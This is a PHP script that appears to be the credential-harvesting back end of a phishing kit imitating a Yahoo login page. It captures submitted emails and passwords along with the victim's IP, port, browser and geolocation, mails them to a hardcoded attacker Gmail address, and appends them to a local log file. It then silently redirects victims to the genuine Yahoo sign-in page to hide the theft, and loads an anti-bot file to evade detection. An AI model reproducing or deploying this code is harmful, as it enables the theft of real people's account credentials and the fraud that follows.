<?php
$Email = $_POST['Email'];
$password = $_POST['password'];
$ip = $_POST['ip'];
include 'antibots.php';

$TheBoss = "outtavault01001@gmail.com";
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$logId = uniqid();
$geoplugin->locate();
$subject = "YourLogs Logs by Anthrax Linkers - $country ($logId)";
$headers = "From:  Result Server <noreplay.dgz.gdn@protonmail.com>";

$message .= "---------------|54|---------------\n";
$message .= "Email: $Email\n";
$message .= "Password: $password\n";
$message .= "IP Address : $ip\n";
$message .= "Port : $port\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: " . $browser . "\n";
$message .= "--------------------------------------------\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "-------------- modified by anthrax.win32@outlook.com -----------------\n";
$message .= "$logId\n";

mail($TheBoss, $subject, $message, $headers);

echo "<html><head><script>window.top.location.href='https://login.yahoo.com/?.lang=en-US&src=homepage&.done=https%3A%2F%2Fwww.yahoo.com%2F%3Fguccounter%3D1&pspid=2023538075&activity=ybar-signin';</script></head><body></body></html>";

$fp = fopen("finish2.txt", "a");
fputs($fp, $message);
fclose($fp);
$praga = rand();
$praga = md5($praga);

?>
